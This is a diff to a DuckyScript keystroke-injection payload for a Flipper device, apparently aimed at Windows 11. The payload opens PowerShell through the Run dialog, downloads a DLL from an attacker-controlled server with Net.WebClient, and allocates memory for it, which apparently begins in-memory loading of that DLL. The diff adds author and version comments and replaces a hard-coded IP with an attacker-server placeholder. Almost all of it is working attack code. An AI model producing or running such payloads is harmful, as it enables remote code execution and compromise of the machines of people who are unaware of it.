@@ -1,3 +1,7 @@
+REM Author: sasquatchchicken
+REM Version 1.0 (Flipper Ducky)
+REM Target: windows 11
+REM I found that these Delay intervals worked best for proper execution of the powershell script
 DELAY 500
 REM Open PowerShell via Run
 GUI r
@@ -12,7 +16,7 @@ REM Load the compiled DLL into memory (hosted on the attacker's server)
 STRING $webClient = New-Object Net.WebClient
 ENTER
 DELAY 1500
-STRING $dllBytes = $webClient.DownloadData('http://192.168.1.15:8080/mydll.dll')
+STRING $dllBytes = $webClient.DownloadData('http://<attacker_server_IP>:8080/mydll.dll')
 ENTER
 DELAY 1500
 STRING $virtualAlloc = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($dllBytes.Length)
